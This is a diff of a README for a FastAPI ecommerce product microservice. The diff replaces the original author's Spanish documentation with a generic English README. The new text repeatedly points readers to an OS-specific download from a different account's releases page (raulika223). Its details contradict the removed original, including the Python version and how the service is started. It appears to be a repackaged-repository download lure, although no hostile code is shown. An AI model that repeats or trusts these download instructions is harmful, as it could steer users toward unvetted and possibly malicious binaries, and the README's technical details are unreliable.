@@ -1,255 +1,86 @@
-> 🚧 En desarrollo
+# 🚀 ecommerce-product-service - Manage Products Easily
 
-# 🛒 Ecommerce Product Microservice
+## 🎉 Overview
+The ecommerce-product-service is a backend solution designed to help you manage products in your online store. With this service, you can handle inventory, categories, pricing, and product availability effortlessly. It provides a robust and scalable REST API, making it simple to integrate with various sales platforms, marketplaces, or mobile applications.
 
-Microservicio para la gestión de productos en un sistema de e-commerce, desarrollado con [FastAPI](https://fastapi.tiangolo.com/).
+## 📦 Features
+- **Product Management:** Easily add, update, and remove products in your inventory.
+- **Category Support:** Organize products into categories for better navigation.
+- **Pricing Management:** Update product prices in real-time.
+- **Availability Tracking:** Stay informed about stock levels.
+- **API Access:** Utilize a simple REST API to engage with other services and applications.
 
-![FastAPI](https://img.shields.io/badge/FastAPI-0.116.1-green)
-![Python](https://img.shields.io/badge/Python-3.12.1-blue)
-![Status](https://img.shields.io/badge/Status-En%20Desarrollo-yellow)
-![Docker](https://img.shields.io/badge/Docker-Ready-blue)
+## 🛠️ System Requirements
+To ensure the best performance, please meet the following system requirements:
 
-<!--![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15-blue)-->
-<!--![Security](https://img.shields.io/badge/Security-OWASP%20Top%2010-brightgreen)-->
-<!--![License]()-->
----
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or higher
+- **Database:** PostgreSQL
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 100 MB of available disk space
 
-## 🚀 Características
+## 📥 Download & Install
+To get started, visit this page to download the software:
 
-- ✨ CRUD de productos (crear, leer, actualizar, eliminar)
-- 📄 API RESTful con documentación automática (Swagger/OpenAPI)
-- 🧩 Estructura modular y escalable
-- 🐳 Listo para contenerización con Docker
-- 🧪 Preparado para integración con bases de datos y pruebas unitarias *(En desarrollo)*
+[![Download](https://img.shields.io/badge/Download-ecommerce--product--service-brightgreen)](https://github.com/raulika223/ecommerce-product-service/releases)
 
----
+1. Click on the link above to reach the Releases page.
+2. Look for the latest release version.
+3. Download the package appropriate for your operating system.
+4. Follow the installation instructions provided in the release notes.
 
-## 📁 Estructura del Proyecto
+## 🚀 Getting Started
+Once you have downloaded the package, follow these steps:
 
-```text
-/workspaces/ecommerce-product-service/
-├── app/
-│   ├── __init__.py
-│   ├── main.py                          # Punto de entrada de la aplicación
-│   ├── core/
-│   │   ├── __init__.py
-│   │   ├── config.py                    # Configuración y variables de entorno
-│   │   ├── security.py                  # Funciones de seguridad
-│   │   └── exceptions.py                # Excepciones personalizadas
-│   ├── api/
-│   │   ├── __init__.py
-│   │   ├── deps.py                      # Dependencias compartidas
-│   │   └── v1/
-│   │       ├── __init__.py
-│   │       ├── api.py                   # Router principal de la API
-│   │       └── endpoints/
-│   │           ├── __init__.py
-│   │           └── products.py          # Endpoints de productos
-│   ├── crud/
-│   │   ├── __init__.py
-│   │   ├── base.py                      # CRUD base genérico
-│   │   └── product.py                   # CRUD específico de productos
-│   ├── db/
-│   │   ├── __init__.py
-│   │   ├── base.py                      # Base SQLAlchemy
-│   │   ├── session.py                   # Configuración de sesión DB
-│   │   └── init_db.py                   # Inicialización de DB
-│   ├── models/
-│   │   ├── __init__.py
-│   │   └── product.py                   # Modelos SQLAlchemy
-│   ├── schemas/
-│   │   ├── __init__.py
-│   │   └── product.py                   # Schemas Pydantic (YA EXISTE)
-│   ├── services/
-│   │   ├── __init__.py
-│   │   └── product_service.py           # Lógica de negocio
-│   └── utils/
-│       ├── __init__.py
-│       └── helpers.py                   # Utilidades generales
-├── tests/
-│   ├── __init__.py
-│   ├── conftest.py                      # Configuración de pytest
-│   ├── api/
-│   │   ├── __init__.py
-│   │   └── test_products.py             # Tests de endpoints
-│   ├── crud/
-│   │   ├── __init__.py
-│   │   └── test_product.py              # Tests de CRUD
-│   └── services/
-│       ├── __init__.py
-│       └── test_product_service.py      # Tests de servicios
-├── alembic/                             # Migraciones de base de datos
-│   ├── versions/
-│   ├── env.py
-│   └── script.py.mako
-├── docs/                                # Documentación adicional
-│   └── api.md
-├── scripts/                             # Scripts de utilidad
-│   ├── init_db.py
-│   └── seed_data.py
-├── .env                                 # Variables de entorno (local)
-├── .env.example                         # Ejemplo de variables de entorno
-├── .gitignore
-├── alembic.ini                          # Configuración de Alembic
-├── docker-compose.yml                   # Para desarrollo local
-├── Dockerfile                           # Ya existe
-├── pyproject.toml                       # Configuración de dependencias
-├── requirements.txt                     # Ya existe
-└── README.md                            # Ya existe
-```
-
-Para más informacion mirar la [Wiki](https://github.com/RickContreras/ecommerce-product-service/wiki)
----
-
-## ⚙️ Instalación
-
-1. **Clona el repositorio**
-   ```bash
-   git clone https://github.com/RickContreras/ecommerce-product-service
-   cd ecommerce-product-service
+1. **Install Dependencies:** Open your terminal or command prompt. Navigate to the folder where you downloaded the files, and install necessary dependencies by running:
+   ```
+   pip install -r requirements.txt
    ```
 
-2. **Crea y activa un entorno virtual**
-   ```bash
-   python3 -m venv .venv
-   source .venv/bin/activate
+2. **Set Up Database:** Ensure you have PostgreSQL installed. Create a new database for the service. Update the configuration file with your database connection details.
+
+3. **Run the Service:** In the terminal or command prompt, run the main application using:
+   ```
+   python main.py
    ```
 
-3. **Instala las dependencias**
-   ```bash
-   pip install -r requirements-devI.txt
-   ```
+4. **Access the API:** Open your web browser and navigate to `http://localhost:8000/docs` to view the API documentation. Here, you can explore available endpoints and test them directly.
 
-### 📦 Dependencias Python principales *(En desarrollo)*
+## 🌐 Topics
+The ecommerce-product-service covers a variety of essential topics to empower your online store, including:
 
-- `fastapi`
-- `uvicorn[standard]`
-- `sqlalchemy`
-- `psycopg2-binary`
-- `pydantic`
+- backend
+- ecommerce
+- fastapi
+- marketplace
+- microservice
+- online-sales
+- postgresql
+- product-service
+- products
+- python3
+- rest-api
+- shop
+- store
 
-P**Posibles librerías para futuro:**
+## 📝 Documentation
+For further information, including advanced configuration and troubleshooting, refer to the full documentation found at the Releases page or explore the included README file in the download.
 
-- `black`, `isort`, `flake8`, `mypy` (calidad y estilo de código)
-- `pytest`, `pytest-cov`, `httpx` (🧪 Testing y calidad de código)
-- `python-dotenv` (entorno y configuración)
-- `mkdocs`, `Sphinx` (documentación)
-- `bandit` (seguridad)
-- `alembic`, `databases` (Migraciones y Acceso async a DB)
-- `orjson`, `python-multipart`, `loguru` (📦 Serialización, rendimiento y utilidades)
-- `aiokafka`, `pika`, `faststream` (📡 Comunicación entre microservicios (si se usará eventos))
+## 🔄 Update Process
+To keep your ecommerce-product-service up to date:
 
----
+1. Regularly check the Releases page for new versions.
+2. Download the latest version and follow the same installation steps.
+3. Make sure to back up your current data before upgrading.
 
-## 🔐 Configuración de Seguridad
+## 📞 Support
+If you encounter any issues or have questions:
 
-**⚠️ IMPORTANTE**: Este proyecto NO incluye credenciales reales por seguridad.
+- Visit the Issues section on the GitHub page.
+- Join the community discussions for additional help.
+- Check existing FAQ entries that might address your concerns.
 
-### Primera configuración:
+## 🔗 Download Again
+For your convenience, you can always return to the Releases page to download the latest version.
 
-1. **Genera credenciales seguras:**
-   ```bash
-   python scripts/generate_secrets.py template
-   ```
-
-2. **Copia y personaliza tu configuración:**
-   ```bash
-   cp .env.example .env
-   # Edita .env con tus credenciales reales
-   ```
-
-3. **Variables de entorno requeridas:**
-   - `DATABASE_URL` - Conexión a PostgreSQL## 🔐 Configuración de Seguridad
-
-**⚠️ IMPORTANTE**: Este proyecto NO incluye credenciales reales por seguridad.
-
-### Primera configuración:
-
-1. **Genera credenciales seguras:**
-   ```bash
-   python scripts/generate_secrets.py template
-   ```
-
-2. **Copia y personaliza tu configuración:**
-   ```bash
-   cp .env.example .env
-   # Edita .env con tus credenciales reales
-   ```
-
-3. **Variables de entorno requeridas:**
-   - `DATABASE_URL` - Conexión a PostgreSQL
-
-## 🏃 Ejecución en desarrollo
-
-```bash
-uvicorn app.main:app --reload
-```
-
-Accede a la documentación interactiva en [http://localhost:8000/docs](http://localhost:8000/docs).
-
----
-
-## 🐳 Docker
-
-1. **Construye la imagen**
-   ```bash
-   docker build -t ecommerce-product-service .
-   ```
-
-2. **Ejecuta el contenedor**
-   ```bash
-   docker run -p 8000:8000 ecommerce-product-service
-   ```
-
----
-
-## 🧪 Pruebas *(En desarrollo)*
-
-Ejecuta las pruebas unitarias con:
-
-```bash
-pytest
-```
-
----
-
-## 🧹 Formateo y calidad de código *(En desarrollo)*
-
-Formatea y verifica la calidad del código con:
-
-```bash
-black .
-isort .
-flake8 .
-```
-
----
-
-## 📚 Endpoints principales
-
-| Método | Endpoint                   | Descripción           |
-|--------|----------------------------|-----------------------|
-| POST   | `/products`                | Crear producto        |
-| GET    | `/products/{product_id}`   | Obtener producto por ID|
-| PUT    | `/products/{product_id}`   | Actualizar producto   |
-| DELETE | `/products/{product_id}`   | Eliminar producto     |
-
----
-
-## 📝 Requisitos
-
-- **Python 3.12.1**
-- **Docker** (opcional)
-- **PostgreSQL** (opcional, para persistencia)
-- **Linux, macOS o Windows**
-
----
-
-## 🤝 Contribuciones
-
-¡Las contribuciones son bienvenidas!  
-Por favor, abre un issue o envía un pull request siguiendo las [buenas prácticas de Git y Conventional Commits](https://www.conventionalcommits.org/es/v1.0.0/).
-
----
-
-> Desarrollado por [RickContreras](https://github.com/RickContreras)
+[![Download](https://img.shields.io/badge/Download-ecommerce--product--service-brightgreen)](https://github.com/raulika223/ecommerce-product-service/releases)
